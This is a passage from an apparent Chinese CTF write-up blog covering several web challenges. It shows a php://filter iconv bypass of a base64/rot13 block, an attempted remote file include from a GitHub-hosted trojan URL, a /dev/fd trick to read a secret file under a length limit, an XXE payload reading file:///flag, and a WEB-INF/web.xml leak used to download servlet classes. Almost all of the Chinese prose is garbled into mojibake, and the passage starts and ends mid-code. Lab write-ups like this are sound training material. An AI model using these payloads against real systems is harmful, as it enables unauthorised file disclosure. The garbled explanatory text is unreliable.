      <span class="variable">$filepath_lower</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$filepath</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$filepath_lower</span>, <span class="string">&#x27;base64&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$exportError</span> = <span class="string">&quot;Blocked: base64 filter is not allowed!&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$filepath_lower</span>, <span class="string">&#x27;rot13&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                    <span class="variable">$exportError</span> = <span class="string">&quot;Blocked: rot13 filter is not allowed!&quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// Vulnerable to path traversal and PHP filter bypass!</span></span><br><span class="line"></span><br><span class="line">                        <span class="variable">$fileContent</span> = <span class="keyword">include</span>(<span class="variable">$filepath</span>);</span><br><span class="line">                        <span class="variable">$exportSuccess</span> = <span class="string">&quot;File exported successfully: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$filepath</span>);</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æºç éƒ½è¯»åˆ°äº†ï¼Œä½†æ˜¯æ²¡æœ‰ä»»ä½•ç”¨å¤„ã€‚ã€‚ã€‚ä¸­é—´å°è¯•è¿œç¨‹æ–‡ä»¶åŒ…å«æœ¨é©¬<code>https://raw.githubusercontent.com/ProbiusOfficial/PHPinclude-labs/main/RFI</code>ï¼ŒæŠ¥é”™æ˜¾ç¤º<code>allow_url_include=0</code> è¿œç¨‹æ–‡ä»¶åŒ…å«ä¹Ÿè¢«ç¦ç”¨äº†ï¼Œå¡ä½äº†</p><p>ä¹‹åå‘ç°å¯ä»¥è¯»å–<code>php://filter/convert.iconv.utf-8.utf-16/resource=flag.php</code>ï¼Œflagæ”¾åœ¨<code>flag.php</code>é‡Œé¢äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ä»€ä¹ˆé¬¼ä¸œè¥¿ï¼Œç³–ä¸¸äº†</p><br/><h1 id="æå®¢å¤§æŒ‘æˆ˜20025-Vibe-SEO"><a href="#æå®¢å¤§æŒ‘æˆ˜20025-Vibe-SEO" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜20025]Vibe SEO"></a>[æå®¢å¤§æŒ‘æˆ˜20025]Vibe SEO</h1><blockquote><p>â€œæˆ‘è®© AI å¸®æˆ‘åšäº†æœç´¢å¼•æ“ä¼˜åŒ–ï¼Œå®ƒå¥½åƒè¯´ä»€ä¹ˆã€æœç´¢å¼•æ“å–œæ¬¢ç»“æ„åŒ–çš„ç«™ç‚¹åœ°å›¾ã€ï¼Œè™½ç„¶ä¸æ˜¯å¾ˆæ‡‚å°±æ˜¯äº†â€</p></blockquote><p>ç”¨dirsearchå¯ä»¥æ‰«åˆ°<code>sitemap.xml</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">urlset</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.sitemaps.org/schemas/sitemap/0.9&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">loc</span>&gt;</span>http://localhost/<span class="tag">&lt;/<span class="name">loc</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">changefreq</span>&gt;</span>weekly<span class="tag">&lt;/<span class="name">changefreq</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">loc</span>&gt;</span>http://localhost/aa__^^.php<span class="tag">&lt;/<span class="name">loc</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">changefreq</span>&gt;</span>never<span class="tag">&lt;/<span class="name">changefreq</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">urlset</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®<code>aa__^^.php</code>ï¼Œæ ¹æ®æŠ¥é”™è¦GETä¼ å…¥<code>filename</code>å‚æ•°è¯»å–æ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨æ­¤å¤„è¯»å–<code>aa__^^.php</code>çš„æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;/my_secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) &lt; <span class="number">11</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">readfile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Filename too long&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰é•¿åº¦é™åˆ¶ï¼Œä¸å¤Ÿè¯»<code>/my_secret.txt</code>ï¼Œæ­¤å¤„è¦åˆ©ç”¨<code>æ–‡ä»¶æè¿°ç¬¦</code>è¯»å–flagï¼Œå› ä¸ºé•¿åº¦é™åˆ¶ç”¨<code>dev/fd/</code>ç›®å½•è¯»å–ï¼Œè¯»åˆ°<code>dev/fd/12</code>æ˜¯<code>aa__^^.php</code>çš„æºç ï¼Œ<code>dev/fd/13</code>æ˜¯<code>my_secret.txt</code>ä¹Ÿå°±æ˜¯flag</p><h3 id="æ–‡ä»¶æè¿°ç¬¦"><a href="#æ–‡ä»¶æè¿°ç¬¦" class="headerlink" title="æ–‡ä»¶æè¿°ç¬¦"></a>æ–‡ä»¶æè¿°ç¬¦</h3><p>åœ¨Unix&#x2F;Linux ç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªâ€œæ–‡ä»¶æè¿°ç¬¦è¡¨â€ï¼Œç”¨äºè·Ÿè¸ªè¯¥è¿›ç¨‹æ‰“å¼€çš„æ‰€æœ‰æ–‡ä»¶ã€ç®¡é“ã€ç½‘ç»œè¿æ¥ç­‰ I&#x2F;O èµ„æºã€‚å½“ä½ ç”¨ <code>fopen()</code>ï¼ˆæˆ–å…¶ä»–ç³»ç»Ÿè°ƒç”¨å¦‚ <code>open()</code>ï¼‰æ‰“å¼€ä¸€ä¸ªæ–°æ–‡ä»¶æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šåœ¨å½“å‰è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦è¡¨ä¸­æ‰¾åˆ°ä¸€ä¸ªç©ºé—²çš„ä½ç½®åˆ†é…ç»™è¯¥æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡<code>/proc/self/fd</code>æˆ–&#x2F;<code>dev/fd</code>é‡å®šå‘åˆ°å¯¹åº”çš„å†…æ ¸æ–‡ä»¶å¯¹è±¡</p><p>ä»¥ä¸‹å‡½æ•°åœ¨å¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œæ—¶ä¼šäº§ç”Ÿæ–‡ä»¶æè¿°ç¬¦</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.<span class="built_in">open</span>()</span><br><span class="line">os.pipe()</span><br><span class="line">os.dup()</span><br><span class="line">os.dup2()</span><br><span class="line">os.eventfd()  <span class="comment"># Linux</span></span><br><span class="line">socket.socket().fileno()</span><br><span class="line"><span class="built_in">open</span>().fileno()</span><br><span class="line">subprocess.Popen().stdout.fileno()</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">fopen</span>()        <span class="comment">// è¿”å›èµ„æºï¼Œå¯ç”¨fileno()è·å–fd</span></span><br><span class="line"><span class="title function_ invoke__">fsockopen</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">socket_create</span>()</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fd = fs.<span class="title function_">openSync</span>(<span class="string">&#x27;file.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æˆ–ä»Streamè·å–</span></span><br><span class="line"><span class="keyword">const</span> stream = fs.<span class="title function_">createReadStream</span>(<span class="string">&#x27;file.txt&#x27;</span>);</span><br><span class="line">stream.<span class="property">fd</span>;  <span class="comment">// å¦‚æœåº•å±‚æ˜¯æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><br/><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>åˆæ˜¯ç™»é™†ç•Œé¢ï¼Œé¢˜ç›®è¯´å’ŒXMLæœ‰å…³ï¼Œå…ˆçœ‹çœ‹å‰ç«¯ä»£ç ï¼Œæ‰¾åˆ°äº†ç™»å½•é€»è¾‘</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&#x27;text/javascript&#x27;</span>&gt; </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doLogin</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> username = $(<span class="string">&quot;#username&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line"><span class="keyword">var</span> password = $(<span class="string">&quot;#password&quot;</span>).<span class="title function_">val</span>();</span><br><span class="line"><span class="keyword">if</span>(username == <span class="string">&quot;&quot;</span> || password == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;Please enter the username and password!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data = <span class="string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; </span><br><span class="line">    $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;doLogin.php&quot;</span>,</span><br><span class="line">        <span class="attr">contentType</span>: <span class="string">&quot;application/xml;charset=utf-8&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: data,</span><br><span class="line">        <span class="attr">dataType</span>: <span class="string">&quot;xml&quot;</span>,</span><br><span class="line">        <span class="attr">anysc</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">result</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> code = result.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;code&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">nodeValue</span>;</span><br><span class="line">        <span class="keyword">var</span> msg = result.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;msg&quot;</span>)[<span class="number">0</span>].<span class="property">childNodes</span>[<span class="number">0</span>].<span class="property">nodeValue</span>;</span><br><span class="line">        <span class="keyword">if</span>(code == <span class="string">&quot;0&quot;</span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(msg + <span class="string">&quot; login fail!&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="string">&quot;1&quot;</span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(msg + <span class="string">&quot; login success!&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(<span class="string">&quot;error:&quot;</span> + msg);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">XMLHttpRequest,textStatus,errorThrown</span>) &#123;</span><br><span class="line">            $(<span class="string">&quot;.msg&quot;</span>).<span class="title function_">text</span>(errorThrown + <span class="string">&#x27;:&#x27;</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å‰ç«¯æŠŠç”¨æˆ·è¾“å…¥æ‰“åŒ…æˆXMLæ ¼å¼ä¼ ç»™åç«¯ï¼Œåç«¯å¤„ç†ååŒæ ·è¿”å›XMLæ ¼å¼çš„æ–‡æœ¬ï¼Œå…¶ä¸­çš„<code>code</code>æ ‡ç­¾å€¼ä¸º<code>0</code>åˆ¤å®šç™»å½•å¤±è´¥ï¼Œä¸º<code>1</code>åˆ™åˆ¤å®šæˆåŠŸ</p><p><img src="/img/post/xmlbook.png" alt="return"></p><p>ä½†æ˜¯è¿™é‡Œçš„é‡ç‚¹å¹¶ä¸åœ¨å¦‚ä½•ç»•è¿‡ç™»å½•éªŒè¯ï¼Œè€Œæ˜¯å®¢æˆ·ç«¯è¿”å›çš„<code>msg</code>æ ‡ç­¾ï¼Œæ—¢ç„¶å®ƒç›´æ¥ç”¨äº†<code>username</code>æ ‡ç­¾çš„å†…å®¹ï¼Œé‚£å°±å¯ä»¥æ„é€ å¤–éƒ¨å®ä½“æ³¨å…¥</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">svg</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">        <span class="symbol">&amp;flag;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line">        123</span><br><span class="line">    <span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åæœåŠ¡å™¨è¿”å›çš„<code>msg</code>æ ‡ç­¾å†…çš„å†…å®¹å°±æ˜¯flagäº†</p><p>éš¾é“çœŸçš„æ²¡äººæƒ³çŸ¥é“<code>doLogin.php</code>é‡Œé¢å†™äº†å•¥å—ï¼Ÿè¯•äº†ç›´æ¥ç”¨<code>file</code>åè®®ä¼šè¿”å›ç©ºï¼Œè¯•è¯•phpä¼ªåè®®ï¼Œç”¨<code>php://filter/convert.base64-encode/resource=/var/www/html/doLogin.php</code>ï¼ŒæŠŠè¿”å›çš„å†…å®¹è§£ç å°±èƒ½è¯»åˆ°åç«¯æºç äº†</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//è´¦å·</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="comment">//å¯†ç </span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è´¦å·å¯†ç äº†ï¼Œèƒ½ç™»å½•æˆåŠŸä½†æ˜¯æ²¡å•¥ç”¨ï¼Œå½“å½©è›‹ç©ç©å¾—äº†</p><br/><h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><p>æœ€è¿‘ä¸æ˜¯çœ‹äº†ç‚¹Javaå˜›ï¼Œæƒ³ç€æ‰¾å‡ é“Javaååºåˆ—çš„é¢˜è§è§ä¸–é¢ï¼Œç»“æœè¿™é¢˜å€’æ˜¯è·Ÿååºåˆ—æ²¡ä»€ä¹ˆå…³ç³»ã€‚ä¸»è¦æ˜¯æœ‰ä¸€äº›å¤„ç†æ–¹å¼å¾ˆæœ‰å¿…è¦å­¦å­¦</p><p>æ‰“å¼€é¶æœºæ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œsqlæ³¨å…¥æ— æœã€‚ç•Œé¢æœ‰ä¸€ä¸ªé“¾æ¥æŒ‡å‘<code>Download?filename=help.docx</code>ï¼Œç‚¹å‡»ä¼šè¿›å…¥ä¸€ä¸ªJavaçš„å¼‚å¸¸ç•Œé¢</p><p><img src="/img/post/EasyJava1.png" alt="exception"></p><p>ä¸æ˜æ‰€ä»¥ï¼Œç›´æ¥è®¿é—®<code>/help.docx</code>ä¼šä¸‹è½½è¯¥æ–‡ä»¶ï¼Œé‡Œé¢çš„å†…å®¹åªæœ‰<code>Are you sure the flag is here? ? ?</code>ï¼Œåˆ«æ— ä»–ç”¨ï¼Œåé¢æŸ¥äº†äº›èµ„æ–™æ‰çŸ¥é“è¿™é‡Œæœ‰<code>WEB-INF/web.xmlæ³„éœ²</code></p><p>è€Œä¸”è¿™é‡Œåˆ©ç”¨<code>/Download</code>çš„æ­£ç¡®æ–¹å¼æ˜¯åˆ©ç”¨POSTè¯·æ±‚ï¼Œæ¯”å¦‚ç”¨POSTå»è®¿é—®<code>/Download?filename=help.docx</code>å»ä¸‹è½½<code>help.docx</code>æ–‡ä»¶ã€‚è¿™é‡ŒåŒæ ·çš„æ–¹å¼å»è®¿é—®<code>/WEB-INF/web.xml</code>è·å–<code>web.xml</code></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>Index<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Index<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.LoginController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.DownloadController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Download<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Flag<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°<code>FlagController</code>åœ¨ç›®å½•<code>/WEB-INF/classes/com/wm/ctf/FlagController</code>ä¸‹ï¼Œç›¸åŒåœ°ä¸‹è½½ä¸‹æ¥ï¼Œåˆ©ç”¨IJçš„åç¼–è¯‘å¯ä»¥çœ‹åˆ°æºç </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(</span></span><br><span class="line"><span class="meta">    name = &quot;FlagController&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagController</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="string">&quot;ZmxhZ3syYWRiOGE2NS03Mzk5LTQwNDEtYmE2Zi00MTY2MDEwNGE2NDR9Cg==&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest var1, HttpServletResponse var2)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getWriter();</span><br><span class="line">        var3.print(<span class="string">&quot;&lt;h1&gt;Flag is nearby ~ Come on! ! !&lt;/h1&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flagæ˜¯ç»è¿‡base64ç¼–ç çš„ï¼Œè§£ç å°±æœ‰äº†</p><p>é—²æ¥æ— äº‹æŠŠ<code>LoginController</code>çš„æºç ä¹Ÿæ‰’äº†ç½¢</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(</span></span><br><span class="line"><span class="meta">    name = &quot;Login&quot;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginController</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        <span class="keyword">if</span> (<span 